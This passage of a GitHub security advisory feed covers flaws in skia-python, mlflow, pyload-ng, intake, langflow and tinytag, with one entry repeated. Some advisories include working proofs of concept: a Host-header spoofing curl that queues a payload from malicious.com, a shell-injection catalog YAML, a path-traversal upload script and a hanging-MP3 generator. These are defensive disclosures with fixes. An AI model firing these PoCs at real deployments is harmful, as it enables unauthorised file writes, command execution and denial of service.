<li><a href="https://github.com/advisories/GHSA-w5g8-5849-vj76">https://github.com/advisories/GHSA-w5g8-5849-vj76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5g8-5849-vj76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-19T18:48:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[skia-python] skia-python vendors vulnerable libfreetype because of pinned cibuildwheel version]]></title>
        <id>https://github.com/advisories/GHSA-2mhw-8qcg-gr96</id>
        <link href="https://github.com/advisories/GHSA-2mhw-8qcg-gr96"/>
        <updated>2026-03-19T18:10:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Linux wheels for skia-python vendor a vulnerable version of
libfreetype that is affected by CVE-2025-27363 [1].</p>
<p>The root cause is a chain of unfortunate events:</p>
<ol>
<li><p>skia-python builds wheels using pinned pypa/<a href="mailto:cibuildwheel@2.21.3">cibuildwheel@2.21.3</a> [2]</p>
</li>
<li><p>cibuildwheel 2.21.3 in turn pins manylinux container images [3]</p>
</li>
<li><p>In these images, version 2.9.1-9.el8 of RedHat package freetype is
<em>preinstalled</em>. This package version is vulnerable and has since been
patched in 2.9.1-10.</p>
</li>
<li><p>During the skia-python Linux build, libfreetype is vendored from the
system, resulting in skia-python.libs/libfreetype-29a7443c.so.6.16.1</p>
</li>
</ol>
<p>[ To find the provenance of your vendored libfreetype, we extracted the
8-character hash of the original binary file that is added during the
build process (29a7443c), and matched it against our database of hashes
all historic Red Hat, Debian and Ubuntu releases of freetype. ]</p>
<ol start="5">
<li><p>Because freetype is only a <em>transitive</em> dependency of the packages
explicitly installed by the build script [4], it is not upgraded to the
patched version [4].</p>
</li>
<li><p>As a result, the published wheels embed a vulnerable libfreetype,
even though patched packages are available upstream.</p>
</li>
</ol>
<p>This appears to be a broader manylinux ecosystem issue. The base images
do not enforce that <code>yum update</code> runs on container start, so
preinstalled libraries may remain vulnerable indefinitely.</p>
<h3 id="patches">Patches</h3>
<blockquote>
<p>In the case of skia-python, the solution is to explicitly install freetype in the build process and rebuild the wheels.</p>
</blockquote>
<p>The original report was suggesting the above, but in the current <code>build_Linux.sh</code> script, the patched <code>freetype-devel</code> version 2.9.1-10 gets installed as a dependency. It's just that we need to rebuild the wheel for a new release.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users must upgrade the wheel package after release.</p>
<h3 id="references">References</h3>
<ol>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27363">https://nvd.nist.gov/vuln/detail/CVE-2025-27363</a></li>
<li><a href="https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/.github/workflows/ci.yml#L38">https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/.github/workflows/ci.yml#L38</a></li>
<li><a href="https://github.com/pypa/cibuildwheel/blob/v2.21.3/cibuildwheel/resources/pinned_docker_images.cfg">https://github.com/pypa/cibuildwheel/blob/v2.21.3/cibuildwheel/resources/pinned_docker_images.cfg</a></li>
<li><a href="https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/scripts/build_Linux.sh#L6">https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/scripts/build_Linux.sh#L6</a></li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kyamagu/skia-python/security/advisories/GHSA-2mhw-8qcg-gr96">https://github.com/kyamagu/skia-python/security/advisories/GHSA-2mhw-8qcg-gr96</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27363">https://nvd.nist.gov/vuln/detail/CVE-2025-27363</a></li>
<li><a href="https://github.com/advisories/GHSA-2mhw-8qcg-gr96">https://github.com/advisories/GHSA-2mhw-8qcg-gr96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mhw-8qcg-gr96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T18:10:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[skia-python] skia-python vendors vulnerable libfreetype because of pinned cibuildwheel version]]></title>
        <id>https://github.com/advisories/GHSA-2mhw-8qcg-gr96</id>
        <link href="https://github.com/advisories/GHSA-2mhw-8qcg-gr96"/>
        <updated>2026-03-19T18:10:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Linux wheels for skia-python vendor a vulnerable version of
libfreetype that is affected by CVE-2025-27363 [1].</p>
<p>The root cause is a chain of unfortunate events:</p>
<ol>
<li><p>skia-python builds wheels using pinned pypa/<a href="mailto:cibuildwheel@2.21.3">cibuildwheel@2.21.3</a> [2]</p>
</li>
<li><p>cibuildwheel 2.21.3 in turn pins manylinux container images [3]</p>
</li>
<li><p>In these images, version 2.9.1-9.el8 of RedHat package freetype is
<em>preinstalled</em>. This package version is vulnerable and has since been
patched in 2.9.1-10.</p>
</li>
<li><p>During the skia-python Linux build, libfreetype is vendored from the
system, resulting in skia-python.libs/libfreetype-29a7443c.so.6.16.1</p>
</li>
</ol>
<p>[ To find the provenance of your vendored libfreetype, we extracted the
8-character hash of the original binary file that is added during the
build process (29a7443c), and matched it against our database of hashes
all historic Red Hat, Debian and Ubuntu releases of freetype. ]</p>
<ol start="5">
<li><p>Because freetype is only a <em>transitive</em> dependency of the packages
explicitly installed by the build script [4], it is not upgraded to the
patched version [4].</p>
</li>
<li><p>As a result, the published wheels embed a vulnerable libfreetype,
even though patched packages are available upstream.</p>
</li>
</ol>
<p>This appears to be a broader manylinux ecosystem issue. The base images
do not enforce that <code>yum update</code> runs on container start, so
preinstalled libraries may remain vulnerable indefinitely.</p>
<h3 id="patches">Patches</h3>
<blockquote>
<p>In the case of skia-python, the solution is to explicitly install freetype in the build process and rebuild the wheels.</p>
</blockquote>
<p>The original report was suggesting the above, but in the current <code>build_Linux.sh</code> script, the patched <code>freetype-devel</code> version 2.9.1-10 gets installed as a dependency. It's just that we need to rebuild the wheel for a new release.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users must upgrade the wheel package after release.</p>
<h3 id="references">References</h3>
<ol>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27363">https://nvd.nist.gov/vuln/detail/CVE-2025-27363</a></li>
<li><a href="https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/.github/workflows/ci.yml#L38">https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/.github/workflows/ci.yml#L38</a></li>
<li><a href="https://github.com/pypa/cibuildwheel/blob/v2.21.3/cibuildwheel/resources/pinned_docker_images.cfg">https://github.com/pypa/cibuildwheel/blob/v2.21.3/cibuildwheel/resources/pinned_docker_images.cfg</a></li>
<li><a href="https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/scripts/build_Linux.sh#L6">https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/scripts/build_Linux.sh#L6</a></li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kyamagu/skia-python/security/advisories/GHSA-2mhw-8qcg-gr96">https://github.com/kyamagu/skia-python/security/advisories/GHSA-2mhw-8qcg-gr96</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27363">https://nvd.nist.gov/vuln/detail/CVE-2025-27363</a></li>
<li><a href="https://github.com/advisories/GHSA-2mhw-8qcg-gr96">https://github.com/advisories/GHSA-2mhw-8qcg-gr96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mhw-8qcg-gr96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T18:10:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] Arbitrary file write via tar traversal in mlflow]]></title>
        <id>https://github.com/advisories/GHSA-fhff-qmm8-h2fp</id>
        <link href="https://github.com/advisories/GHSA-fhff-qmm8-h2fp"/>
        <updated>2026-03-19T17:56:47.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in MLflow's pyfunc extraction process allows for arbitrary file writes due to improper handling of tar archive entries. Specifically, the use of <code>tarfile.extractall</code> without path validation enables crafted tar.gz files containing <code>..</code> or absolute paths to escape the intended extraction directory. This issue affects the latest version of MLflow and poses a high/critical risk in scenarios involving multi-tenant environments or ingestion of untrusted artifacts, as it can lead to arbitrary file overwrites and potential remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-15031">https://nvd.nist.gov/vuln/detail/CVE-2025-15031</a></li>
<li><a href="https://huntr.com/bounties/09856f77-f968-446f-a930-657d126efe4e">https://huntr.com/bounties/09856f77-f968-446f-a930-657d126efe4e</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/3bf6d81ac4d38654c8ff012dbd0c3e9f17e7e346">https://github.com/mlflow/mlflow/commit/3bf6d81ac4d38654c8ff012dbd0c3e9f17e7e346</a></li>
<li><a href="https://github.com/mlflow/mlflow/blob/fe4d9be330426904283401f1d2ed914238b6fc37/mlflow/pyfunc/dbconnect_artifact_cache.py#L140">https://github.com/mlflow/mlflow/blob/fe4d9be330426904283401f1d2ed914238b6fc37/mlflow/pyfunc/dbconnect_artifact_cache.py#L140</a></li>
<li><a href="https://github.com/advisories/GHSA-fhff-qmm8-h2fp">https://github.com/advisories/GHSA-fhff-qmm8-h2fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhff-qmm8-h2fp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T00:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] Improper Authentication and Origin Validation Error in pyload-ng]]></title>
        <id>https://github.com/advisories/GHSA-q485-cg9q-xq2r</id>
        <link href="https://github.com/advisories/GHSA-q485-cg9q-xq2r"/>
        <updated>2026-03-19T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Host Header Spoofing vulnerability in the <code>@local_check</code> decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click'N'Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS).</p>
<h3 id="details">Details</h3>
<p>The <code>pyload</code> WebUI provides an API for the Click'N'Load plugin, which is intended to be accessed only from the local machine (e.g., via a browser extension sending requests to <code>localhost:9666</code>). To enforce this, the <code>pyload</code> application uses a <code>@local_check</code> decorator on the relevant routes in <code>src/pyload/webui/app/blueprints/cnl_blueprint.py</code>.</p>
<p>However, the <code>@local_check</code> implementation relies on the user-controlled <code>HTTP_HOST</code> (derived from the HTTP <code>Host</code> header) to verify the origin:</p>
<pre><code class="language-python"># src/pyload/webui/app/blueprints/cnl_blueprint.py
def local_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        remote_addr = flask.request.environ.get("REMOTE_ADDR", "0")
        http_host = flask.request.environ.get("HTTP_HOST", "0")

        if remote_addr in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost") or http_host in (
                "127.0.0.1:9666",
                "[::1]:9666",
        ):
            return func(*args, **kwargs)
        else:
            return "Forbidden", 403
    return wrapper
</code></pre>
<p>Because <code>http_host</code> is read directly from the <code>Host</code> header of the HTTP request, an external attacker can easily spoof this header (e.g., <code>Host: 127.0.0.1:9666</code>). When this spoofed header is present, the condition <code>http_host in ("127.0.0.1:9666", ...)</code> evaluates to <code>True</code>, completely bypassing the IP address check (<code>remote_addr</code>) and granting access to the protected functions.</p>
<p>The affected routes are:</p>
<ul>
<li><code>/flash/</code> and <code>/flash/&lt;id&gt;</code></li>
<li><code>/flash/add</code></li>
<li><code>/flash/addcrypted</code></li>
<li><code>/flash/addcrypted2</code></li>
<li><code>/flashgot</code> and <code>/flashgot_pyload</code></li>
<li><code>/flash/checkSupportForUrl</code></li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Ensure the PyLoad instance is running and accessible externally.</li>
<li>Ensure the <code>ClickNLoad</code> plugin is enabled in the PyLoad settings (it evaluates to disabled by default).</li>
<li>Send a POST request to one of the protected endpoints, such as <code>/flash/add</code>, and spoof the <code>Host</code> header to <code>127.0.0.1:9666</code>.</li>
</ol>
<p>Example <code>curl</code> command:</p>
<pre><code class="language-bash">curl -i -X POST "http://&lt;pyload-external-ip&gt;:&lt;port&gt;/flash/add" \
     -H "Host: 127.0.0.1:9666" \
     -d "urls=http://malicious.com/payload.bin" \
     -d "package=MaliciousPackage"
</code></pre>
<ol start="4">
<li>Notice that you receive a <code>success\r\n</code> response instead of a <code>403 Forbidden</code>. The package and URL will be successfully added to the PyLoad queue.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows unauthenticated attackers to interact with the Click'N'Load API. Attackers can arbitrarily add URLs to the download queue, which forces the PyLoad server to make outbound requests to attacker-controlled or internal URLs (SSRF). Attackers can also exhaust the server's storage or bandwidth by queueing massive files (DoS).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-q485-cg9q-xq2r">https://github.com/pyload/pyload/security/advisories/GHSA-q485-cg9q-xq2r</a></li>
<li><a href="https://github.com/advisories/GHSA-q485-cg9q-xq2r">https://github.com/advisories/GHSA-q485-cg9q-xq2r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q485-cg9q-xq2r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-19T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[intake] Intake has a Command Injection via shell() Expansion in Parameter Defaults]]></title>
        <id>https://github.com/advisories/GHSA-37g4-qqqv-7m99</id>
        <link href="https://github.com/advisories/GHSA-37g4-qqqv-7m99"/>
        <updated>2026-03-19T17:46:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The shell() syntax within parameter default values appears to be automatically expanded during the catalog parsing process.
If a catalog contains a parameter default such as shell(), the command may be executed when the catalog source is accessed.
This means that if a user loads a malicious catalog YAML, embedded commands could execute on the host system.
This behavior could potentially be classified as OS Command Injection / Unsafe Shell Expansion.</p>
<h3 id="details">Details</h3>
<p>The issue appears to originate from how parameter default values are expanded when a catalog source is accessed.</p>
<p>During catalog loading and source access:</p>
<p>Intake resolves parameter default values
The function responsible for expanding defaults processes the shell() syntax
The shell expression triggers a subprocess execution
Because this occurs during catalog evaluation, the command may execute before the user explicitly interacts with the dataset itself.</p>
<p>Affected logic appears to involve:</p>
<pre><code>expand_defaults()
</code></pre>
<p>and related parameter parsing mechanisms.</p>
<h3 id="poc">PoC</h3>
<p>exploit.yaml</p>
<pre><code>metadata:
  version: 1
sources:
  rce_test:
    driver: csv
    description: "Testing shell expansion in parameters"
    args:
      urlpath: "{{ cmd_exec }}"
    parameters:
      cmd_exec:
        display_name: "Test Parameter"
        type: str
        default: "shell(touch /tmp/intake_rce_test)"
</code></pre>
<p>reproduce.py</p>
<pre><code>import intake
import os

PROOF_FILE = "/tmp/intake_rce_test"

if os.path.exists(PROOF_FILE):
    os.remove(PROOF_FILE)

print(f"[*] Proof file exists before: {os.path.exists(PROOF_FILE)}")

try:
    cat = intake.open_catalog("exploit.yaml")

    print("Accessing source...")
    _ = cat["rce_test"]

except Exception as e:
    print(f" Error during execution: {e}")

if os.path.exists(PROOF_FILE):
    print(f" Command execution confirmed, Found: {PROOF_FILE}")
else:
    print("Command execution did not occur.")
</code></pre>
<h3 id="attack-scenario">Attack Scenario</h3>
<p>A potential attack scenario could be:</p>
<ol>
<li>An attacker publishes a malicious Intake catalog YAML file</li>
<li>The victim downloads or loads the catalog</li>
<li>The victim accesses a source entry in the catalog</li>
<li>Parameter defaults are expanded</li>
<li>The shell() expression triggers execution of the embedded command</li>
</ol>
<h3 id="impact">Impact</h3>
<p>If this behavior is confirmed to be unintended, an attacker could distribute a malicious catalog file via:</p>
<ul>
<li>Git repositories</li>
<li>shared datasets</li>
<li>URLs</li>
<li>data science workflows</li>
<li>Any user loading the catalog could unknowingly execute commands with their local user privileges.</li>
</ul>
<h3 id="recommendation">Recommendation</h3>
<p>Possible mitigations could include:</p>
<ul>
<li>disabling shell() expansion by default</li>
<li>requiring an explicit opt-in flag (e.g., allow_shell=True)</li>
<li>restricting shell execution for catalogs loaded from untrusted sources
Please let me know if additional information or testing is needed.
I'm happy to assist with further analysis or validation.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intake/intake/security/advisories/GHSA-37g4-qqqv-7m99">https://github.com/intake/intake/security/advisories/GHSA-37g4-qqqv-7m99</a></li>
<li><a href="https://github.com/advisories/GHSA-37g4-qqqv-7m99">https://github.com/advisories/GHSA-37g4-qqqv-7m99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-37g4-qqqv-7m99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T17:46:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow has an Arbitrary File Write (RCE) via v2 API]]></title>
        <id>https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</id>
        <link href="https://github.com/advisories/GHSA-g2j9-7rj2-gm6c"/>
        <updated>2026-03-19T17:46:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While reviewing the recent patch for <strong>CVE-2025-68478</strong> (External Control of File Name in v1.7.1), I discovered that the root architectural issue within <code>LocalStorageService</code> remains unresolved. Because the underlying storage layer lacks boundary containment checks, the system relies entirely on the HTTP-layer <code>ValidatedFileName</code> dependency.</p>
<p>This defense-in-depth failure leaves the <code>POST /api/v2/files/</code> endpoint vulnerable to Arbitrary File Write. The multipart upload filename bypasses the path-parameter guard, allowing authenticated attackers to write files anywhere on the host system, leading to Remote Code Execution (RCE).</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in two layers:</p>
<ol>
<li><strong>API Layer (<code>src/backend/base/langflow/api/v2/files.py:162</code>)</strong>: Inside the <code>upload_user_file</code> route, the <code>filename</code> is extracted directly from the multipart <code>Content-Disposition</code> header (<code>new_filename = file.filename</code>). It is passed verbatim to the storage service. <code>ValidatedFileName</code> provides zero protection here as it only guards URL path parameters.</li>
<li><strong>Storage Layer (<code>src/backend/base/langflow/services/storage/local.py:114-116</code>)</strong>: The <code>LocalStorageService</code> uses naive path concatenation (<code>file_path = folder_path / file_name</code>). It lacks a <code>resolve().is_relative_to(base_dir)</code> containment check.</li>
</ol>
<p><strong>Recommended Fix:</strong></p>
<ol>
<li>Sanitize the multipart filename before processing:</li>
</ol>
<pre><code class="language-python">from pathlib import Path as StdPath
new_filename = StdPath(file.filename or "").name # Strips directory traversal characters
if not new_filename or ".." in new_filename:
    raise HTTPException(status_code=400, detail="Invalid file name")
</code></pre>
<ol start="2">
<li>Add a canonical path containment check inside <code>LocalStorageService.save_file</code> to permanently kill this vulnerability class.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>This Python script verifies the vulnerability against <code>langflowai/langflow:latest</code> (v1.7.3) by writing a file outside the user's UUID storage directory.</p>
<pre><code class="language-python">import requests

BASE_URL = "http://localhost:7860"
# Authenticate to get a valid JWT
token = requests.post(f"{BASE_URL}/api/v1/login", data={"username": "admin", "password": "admin"}).json()["access_token"]

# Payload using directory traversal in the multipart filename
TRAVERSAL_FILENAME = "../../traversal_proof.txt"
SENTINEL_CONTENT = b"CVE_RESEARCH_SENTINEL_KEY"

resp = requests.post(
    f"{BASE_URL}/api/v2/files/",
    headers={"Authorization": f"Bearer {token}"},
    files={"file": (TRAVERSAL_FILENAME, SENTINEL_CONTENT, "text/plain")},
)

print(f"Status: {resp.status_code}") # Returns 201
# The file is successfully written to `/app/data/.cache/langflow/traversal_proof.txt`
</code></pre>
<p>Server Logs:</p>
<pre><code>2026-02-19T10:04:54.031888Z [info     ] File ../traversal_proof.txt saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
2026-02-19T10:05:51.792520Z [info     ] File secret_image.png saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
</code></pre>
<p>Docker cntainer file:</p>
<pre><code>user@40416f6848f2:~/.cache/langflow$ ls
3668bcce-db6c-4f58-834c-f49ba0024fcb  profile_pictures	secret_key  traversal_proof.txt
</code></pre>
<h3 id="impact">Impact</h3>
<p>Authenticated Arbitrary File Write. An attacker can overwrite critical system files, inject malicious Python components, or overwrite <code>.ssh/authorized_keys</code> to achieve full Remote Code Execution on the host server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c">https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c</a></li>
<li><a href="https://github.com/advisories/GHSA-g2j9-7rj2-gm6c">https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-19T17:46:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinytag] Denial of service via non-terminating SYLT frame parsing loop in tinytag]]></title>
        <id>https://github.com/advisories/GHSA-f4rq-2259-hv29</id>
        <link href="https://github.com/advisories/GHSA-f4rq-2259-hv29"/>
        <updated>2026-03-20T21:20:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>tinytag</code> <code>2.2.0</code> allows an attacker who can supply MP3 files for parsing to trigger a non-terminating loop while the library parses an ID3v2 <code>SYLT</code> (synchronized lyrics) frame. In server-side deployments that automatically parse attacker-supplied files, a single <code>498</code>-byte MP3 can cause the parsing operation to stop making progress and remain busy until the worker or process is terminated.</p>
<h3 id="details">Details</h3>
<p>In tag <code>2.2.0</code> (<code>6f1d3060f393743c2ec34d07c0855cceed827244</code>), the reachable call path is:</p>
<ul>
<li><code>TinyTag.get</code> in <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L144-L154"><code>tinytag/tinytag.py#L144-L154</code></a></li>
<li><code>_load</code> in <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L259-L266"><code>tinytag/tinytag.py#L259-L266</code></a></li>
<li><code>_parse_tag</code> and <code>_parse_id3v2</code> in <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1059-L1092"><code>tinytag/tinytag.py#L1059-L1092</code></a></li>
<li><code>_parse_frame</code> for <code>SYLT</code> / <code>SLT</code> in <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1316-L1318"><code>tinytag/tinytag.py#L1316-L1318</code></a></li>
<li><code>_parse_synced_lyrics</code> and <code>_find_string_end_pos</code> in <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1219-L1248"><code>tinytag/tinytag.py#L1219-L1248</code></a> and <a href="https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1340-L1352"><code>tinytag/tinytag.py#L1340-L1352</code></a></li>
</ul>
<p>The root cause is that <code>_parse_synced_lyrics</code> assumes <code>_find_string_end_pos</code> always returns a position greater than the current <code>offset</code>. That assumption is false when no string terminator is present in the remaining frame content.</p>
<p>For single-byte encodings, <code>_find_string_end_pos</code> does:</p>
<pre><code class="language-python">return content.find(b'\x00', start_pos) + 1
</code></pre>
<p>If no terminator exists, <code>content.find(...)</code> returns <code>-1</code>, so the function returns <code>0</code>. <code>_parse_synced_lyrics</code> then does <code>offset = end_pos</code>, which resets <code>offset</code> to <code>0</code> inside:</p>
<pre><code class="language-python">while offset &lt; content_length:
    end_pos = self._find_string_end_pos(content, encoding, offset)
    value = self._decode_string(encoding + content[offset:end_pos]).lstrip('\n')
    offset = end_pos
    time = unpack('&gt;I', content[offset:offset + 4])[0]
</code></pre>
<p>Because <code>offset</code> is reset to <code>0</code>, the loop condition remains true and the parser stops making forward progress. The UTF-16 branch in <code>_find_string_end_pos</code> has the same shape: if no <code>b'\x00\x00'</code> terminator is found, it also returns <code>0</code>, so the same non-progress condition applies there.</p>
<p><code>SYLT</code> parsing support was introduced by commit <a href="https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a"><code>4d649b9c314ada8ff8a74e0469e9aadb3acb252a</code></a> (<code>ID3: Make synced lyrics available in 'other.lyrics' (LRC format) (#270)</code>), which first shipped in <code>2.2.0</code>. I confirmed that <code>2.1.2</code> does not contain <code>_parse_synced_lyrics</code>, so <code>2.2.0</code> is the only confirmed affected release at this time.</p>
<p>Test environment:</p>
<ul>
<li>MacBook Air (Apple M2), macOS <code>26.3</code> / Darwin <code>arm64</code></li>
<li>Python <code>3.14.3</code></li>
<li>Confirmed affected release: <code>tinytag 2.2.0</code> (<code>6f1d3060f393743c2ec34d07c0855cceed827244</code>)</li>
<li>Also reproduced on current <code>main</code> commit <code>1d23f6fe169c92c070a265f9108e295577141383</code></li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following self-contained PoC generates a malformed <code>SYLT</code> frame and passes it to <code>TinyTag.get</code>:</p>
<pre><code class="language-python">#!/usr/bin/env python3
import signal
import struct
import time
from io import BytesIO

from tinytag import TinyTag


def create_malicious_mp3() -&gt; bytes:
    id3_header = b"ID3" + bytes([3, 0, 0])  # ID3v2.3
    encoding = b"\x00"  # ISO-8859-1
    language = b"eng"
    timestamp_format = b"\x02"
    content_type = b"\x01"
    descriptor = b"test\x00"
    lyrics_data = b"A" * 50  # no null terminator in the remaining SYLT payload
    frame_content = (
        encoding + language + timestamp_format + content_type + descriptor + lyrics_data
    )
    frame = b"SYLT" + struct.pack("&gt;I", len(frame_content)) + b"\x00\x00" + frame_content

    tag_size = len(frame)
    synchsafe = bytearray(4)
    n = tag_size
    for i in range(3, -1, -1):
        synchsafe[i] = n &amp; 0x7F
        n &gt;&gt;= 7

    return (
        id3_header
        + bytes(synchsafe)
        + frame
        + b"\xff\xfb\x90\x00"
        + b"\x00" * 413
    )


def timeout_handler(signum, frame) -&gt; None:
    print("CONFIRMED: parsing did not finish within 10.0s; external interruption was required")
    raise SystemExit(1)


signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(10)
start = time.time()

try:
    TinyTag.get(file_obj=BytesIO(create_malicious_mp3()), filename="poc.mp3")
    signal.alarm(0)
    print(f"Unexpectedly completed in {time.time() - start:.3f}s")
except SystemExit:
    raise
except Exception as exc:
    signal.alarm(0)
    print(f"Unexpected exception before timeout: {type(exc).__name__}: {exc}")
</code></pre>
<p>Observed output on <code>2.2.0</code> in the environment above:</p>
<pre><code class="language-text">CONFIRMED: parsing did not finish within 10.0s; external interruption was required
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who can supply MP3 files for parsing can cause tinytag to enter a non-terminating loop in its own parser. This is a library-level availability issue in the documented parsing path.</p>
<p>In server-side processing of attacker-supplied files, a single request can tie up a worker or process that performs metadata extraction. In local or desktop integrations, opening a malicious file can hang the parsing task until it is interrupted.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in the following commits:</p>
<ul>
<li><a href="https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402">https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402</a></li>
<li><a href="https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a">https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinytag/tinytag/security/advisories/GHSA-f4rq-2259-hv29">https://github.com/tinytag/tinytag/security/advisories/GHSA-f4rq-2259-hv29</a></li>
<li><a href="https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a">https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a</a></li>
<li><a href="https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402">https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32889">https://nvd.nist.gov/vuln/detail/CVE-2026-32889</a></li>
<li><a href="https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a">https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a</a></li>
<li><a href="https://github.com/advisories/GHSA-f4rq-2259-hv29">https://github.com/advisories/GHSA-f4rq-2259-hv29</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4rq-2259-hv29</uri>
        </author>
